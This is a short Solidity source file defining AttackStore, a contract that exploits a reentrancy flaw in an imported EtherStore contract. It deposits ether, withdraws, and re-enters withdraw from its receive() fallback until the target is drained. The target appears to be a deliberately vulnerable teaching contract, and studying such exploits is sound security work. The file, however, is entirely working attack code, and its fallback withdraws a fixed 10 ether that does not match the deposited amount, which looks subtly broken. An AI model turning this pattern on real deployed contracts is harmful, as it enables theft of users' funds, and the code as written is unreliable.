// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;

import "./EtherStore.sol";

contract AttackStore {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback or Recieve is called when EtherStore sends Ether to this contract.
    receive() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw(10 ether);
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: msg.value}();
        etherStore.withdraw(msg.value);
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
